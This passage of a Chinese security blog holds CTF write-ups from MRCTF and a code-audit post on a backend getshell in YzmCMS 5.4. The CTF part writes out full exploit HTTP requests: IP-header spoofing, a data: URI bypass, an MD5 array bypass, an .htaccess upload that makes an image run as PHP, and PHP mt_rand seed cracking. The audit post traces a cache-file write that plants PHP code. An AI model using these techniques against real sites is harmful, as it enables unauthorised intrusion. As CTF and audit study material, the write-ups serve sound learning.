![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]])
+  --&gt;</code></pre>
+<ul>
+<li>解密得</li>
+</ul>
+<pre><code>  post me Merak</code></pre><ul>
+<li>POST Merak=1，得到源码</li>
+</ul>
+<pre><code class="php">  &lt;?php 
+  error_reporting(0); 
+  include &#39;takeip.php&#39;;
+  ini_set(&#39;open_basedir&#39;,&#39;.&#39;); 
+  include &#39;flag.php&#39;;
+
+  if(isset($_POST[&#39;Merak&#39;])){ 
+      highlight_file(__FILE__); 
+      die(); 
+  } 
+
+
+  function change($v){ 
+      $v = base64_decode($v); 
+      $re = &#39;&#39;; 
+      for($i=0;$i&lt;strlen($v);$i++){ 
+          $re .= chr ( ord ($v[$i]) + $i*2 ); 
+      } 
+      return $re; 
+  }
+  echo &#39;Local access only!&#39;.&quot;&lt;br/&gt;&quot;;
+  $ip = getIp();
+  if($ip!=&#39;127.0.0.1&#39;)
+  echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;
+  if($ip === &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; ){
+  echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);
+  echo file_get_contents(change($_GET[&#39;file&#39;])); }
+  ?&gt;  </code></pre>
+<ul>
+<li><p>绕过IP的方法<code>Client-IP: 127.0.0.1</code>,靶机没法访问外网，使用data协议去绕过file_get_contents.</p>
+</li>
+<li><p>而change的破解方法也就是把加号改成减号即可。</p>
+</li>
+</ul>
+<pre><code class="php">
+  function dechange($v){ 
+      $re = &#39;&#39;; 
+      for($i=0;$i&lt;strlen($v);$i++){ 
+          $re .= chr ( ord ($v[$i]) - $i*2 ); 
+      } 
+      return base64_encode($re); 
+  }</code></pre>
+<ul>
+<li><p>exp:</p>
+<pre><code class="http">GET /secrettw.php?2333=data:text/html;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI= HTTP/1.1
+Host: c5d4aa30-f6d3-44bf-a066-e2ece3b8c939.merak-ctf.site
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Client-IP: 127.0.0.1
+</code></pre>
+</li>
+</ul>
+<h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>XFF绕过</p>
+<h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><ul>
+<li><p>访问直接给源码</p>
+<pre><code class="php">include &#39;flag.php&#39;;
+$flag=&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;;
+if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) {
+    $id=$_GET[&#39;id&#39;];
+    $gg=$_GET[&#39;gg&#39;];
+    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {
+        echo &#39;You got the first step&#39;;
+        if(isset($_POST[&#39;passwd&#39;])) {
+            $passwd=$_POST[&#39;passwd&#39;];
+            if (!is_numeric($passwd))
+            {
+                 if($passwd==1234567)
+                 {
+                     echo &#39;Good Job!&#39;;
+                     highlight_file(&#39;flag.php&#39;);
+                     die(&#39;By Retr_0&#39;);
+                 }
+                 else
+                 {
+                     echo &quot;can you think twice??&quot;;
+                 }
+            }
+            else{
+                echo &#39;You can not get it !&#39;;
+            }
+
+        }
+        else{
+            die(&#39;only one way to get the flag&#39;);
+        }
+}
+    else {
+        echo &quot;You are not a real hacker!&quot;;
+    }
+}
+else{
+    die(&#39;Please input first&#39;);
+}
+}Please input first</code></pre>
+<pre><code></code></pre></li>
+<li><p>exp</p>
+</li>
+</ul>
+<p>​```http<br>  POST /?id[]=1&amp;gg[]=2 HTTP/1.1<br>  Host: a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site<br>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0<br>  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>  Accept-Encoding: gzip, deflate<br>  Content-Type: application/x-www-form-urlencoded<br>  Content-Length: 15<br>  Origin: <a href="http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site" target="_blank" rel="noopener">http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site</a><br>  Connection: close<br>  Referer: <a href="http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site/?id[]=1&amp;gg[]=2" target="_blank" rel="noopener">http://a3092e2c-32f4-44c0-903b-9d635e724034.merak-ctf.site/?id[]=1&amp;gg[]=2</a><br>  Upgrade-Insecure-Requests: 1<br>  X-Forwarded-For: 127.0.0.1</p>
+<p>  passwd=1234567a</p>
+<pre><code>
+## 你传你🐎呢
+
+- hatcess
+
+```http
+  POST /upload.php HTTP/1.1
+  Host: b0e25267-c1c2-44f7-8436-023984a8c150.merak-ctf.site
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+  Accept-Encoding: gzip, deflate
+  Content-Type: multipart/form-data; boundary=---------------------------334048973639751065563777068351
+  Content-Length: 434
+  Origin: http://b0e25267-c1c2-44f7-8436-023984a8c150.merak-ctf.site
+  Connection: close
+  Referer: http://b0e25267-c1c2-44f7-8436-023984a8c150.merak-ctf.site/
+  Cookie: PHPSESSID=042113335d44b84e0d7f11bd0059b8de
+  Upgrade-Insecure-Requests: 1
+  X-Forwarded-For: 127.0.0.1
+
+  -----------------------------334048973639751065563777068351
+  Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;
+  Content-Type: image/jpeg
+
+    &lt;FilesMatch &quot;shell.jpg&quot;&gt;
+      SetHandler application/x-httpd-php
+    &lt;/FilesMatch&gt;
+
+  -----------------------------334048973639751065563777068351
+  Content-Disposition: form-data; name=&quot;submit&quot;
+
+  ä¸éå»ä¸
+  -----------------------------334048973639751065563777068351--</code></pre><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>扫出源码泄露：<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
+<pre><code class="php">&lt;?php 
+header(&#39;Content-type:text/html; charset=utf-8&#39;);
+error_reporting(0);
+if(isset($_POST[&#39;login&#39;])){
+    $username = $_POST[&#39;username&#39;];
+    $password = $_POST[&#39;password&#39;];
+    $Private_key = $_POST[&#39;Private_key&#39;];
+    if (($username == &#39;&#39;) || ($password == &#39;&#39;) ||($Private_key == &#39;&#39;)) {
+        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
+        header(&#39;refresh:2; url=login.html&#39;);
+        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;
+        exit;
+}
+    else if($Private_key != &#39;*************&#39; )
+    {
+        header(&#39;refresh:2; url=login.html&#39;);
+        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;
+        exit;
+    }
+
+    else{
+        if($Private_key === &#39;************&#39;){
+        $getuser = &quot;SELECT flag FROM user WHERE username= &#39;crispr&#39; AND password = &#39;$password&#39;&quot;.&#39;;&#39;; 
+        $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);
+        mysql_select_db(&quot;test&quot;,$link);
+        $result = mysql_query($getuser);
+        while($row=mysql_fetch_assoc($result)){
+            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;
+        }
+    }
+    }
+
+} 
+// genarate public_key 
+function public_key($length = 16) {
+    $strings1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
+    $public_key = &#39;&#39;;
+    for ( $i = 0; $i &lt; $length; $i++ )
+    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+    return $public_key;
+  }
+
+  //genarate private_key
+  function private_key($length = 12) {
+    $strings2 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
+    $private_key = &#39;&#39;;
+    for ( $i = 0; $i &lt; $length; $i++ )
+    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+    return $private_key;
+  }
+  $Public_key = public_key();
+  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</code></pre>
+<ul>
+<li>通过公钥去还原随机数种子后，算出私钥</li>
+</ul>
+<pre><code class="php">  &lt;?php
+
+   $pass_now = &quot;KVQP0LdJKRaV3n9D&quot;;
+   $allowable_characters = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
+   for($j = 0; $j &lt; strlen($pass_now); $j++)
+
+   {
+
+   for ($i = 0; $i &lt;= 61; $i++) {
+
+   if($pass_now[$j] == $allowable_characters[$i])
+
+   {
+
+   echo &quot;$i $i 0 61 &quot;;
+
+   break;
+
+   }
+
+   }
+
+   }</code></pre>
+<pre><code class="shell">  ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</code></pre>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20200401/15857273966848.png" alt="img">![im</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d45484efe7.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d45484efe7.html" class="post-title-link" itemprop="url">YzmCMS-V5.4 后台Getshell</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-12-15 22:12:56" itemprop="dateCreated datePublished" datetime="2019-12-15T22:12:56+08:00">2019-12-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:16:23" itemprop="dateModified" datetime="2020-10-14T17:16:23+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><blockquote>
+<p>漏洞文件：yzmphp\core\class\cache_file.class.php</p>
+</blockquote>
+<ul>
+<li>代码171-179行,使用了file_put_contents(),其中<code>$file</code>和<code>$contents</code>可控</li>
+</ul>
+<pre><code class="php">protected function _fileputcontents($file, $contents){
+    if($this-&gt;config[&#39;mode&#39;] == 1){
+        $contents = serialize($contents);
+    }else{
+        $contents = &quot;&lt;?php\nreturn &quot;.var_export($contents, true).&quot;;\n?&gt;&quot;;
+    }
+
+    $filesize = file_put_contents($file, $contents, LOCK_EX);
+    return $filesize ? $filesize : false;
+}</code></pre>
+<ul>
+<li>我们继续跟进<code>_fileputcontents()</code>,在同一文件代码62-75行调用了该方法，我们继续跟进<code>set()</code></li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/1576413364302.png" alt="img"></p>
+<blockquote>
+<p>漏洞文件：yzmphp\core\function\global.func.php</p>
+</blockquote>
+<ul>
+<li><code>global.func.php</code>的1017-1021中的<code>setcache()</code>方法疑似调用了<code>set()</code>方法,并且<code>$name, $data, $timeout</code>均可控，我们跟进<code>load_sys_class(&#39;cache_factory&#39;,&#39;&#39;,0);</code>看看<code>get_instance()-&gt;get_cache_instances()</code>到底调用了哪个文件。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764136241676.png" alt="img"></p>
+<blockquote>
+<p>漏洞文件：\yzmphp\core\class\cache_factory.class.php</p>
+</blockquote>
+<ul>
+<li>很明显<code>C(&#39;cache_type&#39;)</code>决定了他调用哪个文件中的<code>set()</code>方法，我们跟进<code>cache_type</code></li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764138453674.png" alt="img"></p>
+<ul>
+<li>跟进发现在<code>common\config\config.php</code>做了定义，<code>cache_type</code>默认使用<code>file</code>，<code>mode</code>存在两种模式，我们选择<code>1</code>-序列化看看或许可能读取缓存存在反序列化的可能。那么回头看他默认使用<code>file</code>也就是调用了<code>cache_file.class.php</code>所以我们的猜测没错。同时这里还是用了<code>file_config</code>这个参数，我们继续跟进<code>setcache()</code>方法</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764140583404.png" alt="img"></p>
+<blockquote>
+<p>漏洞文件：\common\function\system.func.php</p>
+</blockquote>
+<ul>
+<li>这里$modelinfo是从数据库中得到所以可控，$filename指定了名称<code>modelinfo</code>或者<code>modelinfo_all</code>。我们继续跟进<code>get_modelinfo()</code>会发现都不传入参数，所以默认$typeall = 0,也就是说文件名称固定<code>modelinfo</code></li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764172002656.png" alt="img"></p>
+<ul>
+<li>我们再回到<code>yzmphp\core\class\cache_file.class.php</code>,发现文件名称和路径由<code>_file()</code>方法决定。而<code>$id</code>正是我们传入的。我们跟进<code>_file()</code>方法</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764175738040.png" alt="img"></p>
+<ul>
+<li>我们可以得知filename是由config[‘cache_dir’] 和传入的<code>$id</code>和<code>config[&#39;suffix&#39;]</code>拼接而成。我们再看<code>config[&#39;suffix&#39;]</code>和<code>&#39;cache_dir&#39;</code>是什么?</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764216664657.png" alt="img"></p>
+<ul>
+<li>我们在审计<code>common\config\config.php</code>时候已经发现这里定义了<code>file_config</code>,这样我们就完整知道缓存文件写在<code>cache/chche_file/modelinfo.cache.php</code></li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764216283148.png" alt="img"></p>
+<ul>
+<li>而且这里是模型的缓存，我们直接到后台写入一个php代码看看。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/1576421587721.png" alt="img"></p>
+<ul>
+<li>需要访问前台让其生成新的缓存文件。我们打开：<code>cache/chche_file/modelinfo.cache.php</code>看看</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764187209911.png" alt="img"></p>
+<ul>
+<li>我们访问<code>http://域名/cache/chche_file/modelinfo.cache.php</code>看看，成功getshell<br> <img src="http://goodcheerleung.gitee.io/mycute/20191215/15764196355940.png" alt="img"></li>
+</ul>
+<hr>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><ul>
+<li>如果<code>mode</code>选择的模式是2的话是无法getshell的，由于<code>var_export()</code>进行了转义，暂时没有找到方法，但是该cms默认的是选择<code>2</code>导致这个漏洞有点鸡肋。</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d649bc731c.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d649bc731c.html" class="post-title-link" itemprop="url">Websocket-php学习笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-12-12 11:34:26" itemprop="dateCreated datePublished" datetime="2019-12-12T11:34:26+08:00">2019-12-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:07:07" itemprop="dateModified" datetime="2020-10-14T17:07:07+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/学习笔记/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
